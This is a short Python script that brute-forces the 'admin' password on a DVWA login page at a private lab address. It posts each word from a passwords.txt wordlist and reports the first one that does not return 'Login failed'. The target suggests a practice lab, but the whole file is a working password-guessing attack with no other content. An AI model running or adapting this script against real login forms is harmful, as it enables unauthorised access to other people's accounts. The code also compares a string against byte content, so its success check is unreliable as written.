#!python
import requests

target_url="http://10.0.2.8/dvwa/login.php"
data_login = {"username":"admin", "password":"", "Login":"submit"}
#print(response.content)

with open("passwords.txt", "r") as wordlist:
    for word in wordlist:
        word = word.strip()
        data_login["password"] = word
        response = requests.post(target_url, data_login)
        if "Login failed" not in response.content:
            print("[+] Possible password: " + word)
            exit()

print("[+] Reached end of line")